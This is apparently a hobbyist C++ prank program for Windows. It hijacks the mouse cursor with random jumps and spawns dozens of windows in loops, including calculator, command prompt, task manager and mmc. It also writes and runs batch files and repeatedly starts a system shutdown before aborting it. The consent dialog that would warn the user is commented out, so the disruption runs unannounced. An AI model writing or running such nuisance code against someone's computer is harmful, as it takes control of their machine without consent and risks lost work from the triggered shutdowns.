#include<iostream>
#include<windows.h>
#include<stdio.h>
#include<fstream>
using namespace std;



int main()
{
	system("color 8F");
//	int result = MessageBox(MB_APPLMODAL,"请问是否要启动该程序？若启动，会占用较大cpu，此程序无毒！","来自覃子仪的温馨提示",MB_ICONASTERISK|MB_YESNO);
//    if (result == IDNO)
//    {
//    	return 0;
//	}
//	else 
//	{
		int x,y; 
		
		
	    for (int a=0;a<10000;a++)
        {
		    x = rand()%801;
            y = rand()%601;
            SetCursorPos(x,y);
            
        }
        for (int b=0;b<3;b++)
        {
		
            system("start notepad");
    	    system("start calc");
    	    
    	    system("start winver");
    	    
    	    system("start cmd");
    	    system("start Nslookup");
    	   
    	    system("start ");
    	    
    	    
    	    system("start cleanmgr");
    	   
    	    system("start charmap");
    	    
    	    system("start calc");
    	    
    	    system("start calc");
    	    system("start dxdiag");
    	    
    	    system("start cmd");
    	    system("start cmd");
    	    system("start cmd");
    	   
    	    system("start taskmgr");
    	    system("start ");
    	    system("start wiaacmgr");
    	    system("start  mspaint");
    	    system("start mmc");
    	    system("start ");
    	    
        }
        system("start dxdiag");
        Sleep(2000);
		system("taskkill /im notepad.exe") ;
		system("taskkill /im calc.exe") ;
        system("taskkill /im dxdiag.exe") ;
		system("taskkill /im winver.exe") ;
		
		system("taskkill /im  cmd.exe") ;
        system("taskkill /im Nslookup.exe") ;
		
		
		
       
		system("taskkill /im cleanmgr.exe") ;
		
		system("taskkill /im charmap.exe") ;
        
	
	
	
		system("taskkill /im taskmgr.exe") ;
        
		system("taskkill /im wiaacmgr.exe") ;
		system("taskkill /im mspaint.exe") ;
        system("taskkill /im mmc.exe") ;
		
		
        for (int c=0;c<5;c++)
        {
        	system("start notepad");
		}
		system("taskkill /im notepad.exe") ;
		
		for (int d=0;d<5;d++)
        {
        	system("start calc");
		}
		system("taskkill /im calc.exe") ;
		for (int l=0;l<10;l++)
        {
        	system("start calc");
		}
		system("taskkill /im calc.exe") ;
		for (int m=0;m<15;m++)
        {
        	system("start calc");
		}
		system("taskkill /im calc.exe") ;
		
		for (int f=0;f<20;f++)
        {
        	system("start calc");
		}
		system("taskkill /im calc.exe") ;
		for (int n=0;n<10;n++)
        {
        	system("start calc");
		}
		system("taskkill /im calc.exe") ;
		for (int q=0;q<15;q++)
        {
        	system("start cmd");
		}
		system("taskkill /im cmd.exe") ;
		for (int r=0;r<20;r++)
        {
        	system("start taskmgr");
		}
		system("taskkill /im taskmgr.exe") ;
		for (int g=0;g<10;g++)
        {
        	system("start mmc");
		}
		for (int h=0;h<10;h++)
        {
            system("start ");
		}
		ofstream out;
		out.open("eason.bat");
		out<<"dir/s";
		out.close();
		for (int i=0;i<5;i++)
		{
			system("start eason.bat");
		}
		ofstream oo;
		oo.open("eason2.bat");
		oo<<"tree";
		oo.close();
		for (int j=0;j<5;j++)
		{
			system("start eason2.bat");
		}
		//接下来我要把程序都关了
		
		
		system("taskkill /im taskmgr.exe") ;
	    system("taskkill /im mmc.exe") ;
		system("taskkill /im /f cmd.exe") ;
		system("taskkill /im cmd.exe") ;
		system("taskkill /im calc.exe") ;
	    for (int k=0;k<10000;k++)
        {
		    x = rand()%801;
            y = rand()%601;
            SetCursorPos(x,y);
        }
        ofstream o;
//        o.open("easo.txt");
//        o<<"（づ￣3￣）づ╭?～"<<'\n'<<"程序到此便结束了ヾ(=?ω?=)o"<<'\n'<<"制作者：覃子仪EASON"<<'\n'<<"bye!"<<'\a';
//		o.close();
		system("start easo.txt");
		for (int p =0;p<5;p++)
		{
		
		
		    system("shutdown -s");
		    Sleep(100);
		    system("shutdown -a");
	    }
		remove("eason.bat");
		remove("eason2.bat");
		remove("easo.txt");
//	    result = MessageBox(MB_APPLMODAL,"程序已结束！","来自覃子仪的温馨提示",MB_ICONASTERISK|MB_OK);
		return 0;
//    }
	
    //我垃圾得很 
}
